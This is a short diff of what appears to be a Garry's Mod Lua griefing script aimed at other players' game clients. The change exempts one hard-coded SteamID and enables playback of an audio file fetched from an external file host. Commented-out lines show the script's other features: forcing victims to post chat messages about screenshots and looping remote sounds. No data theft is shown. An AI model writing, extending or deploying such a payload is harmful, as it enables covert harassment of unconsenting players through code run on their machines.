@@ -1,4 +1,6 @@
 --if LocalPlayer():GetUserGroup() == "admin" or LocalPlayer():GetUserGroup() == "superadmin" then return end 
+if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then 
+    return end
 local jpegs = 0
 local s = sound
 local Song = false
@@ -191,7 +193,7 @@ end
 --_timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
 --timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
 _timer.Create('hahasong', .1, 1, function() Song = true end)
---s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
+s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
 --s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
 --s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
 --s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
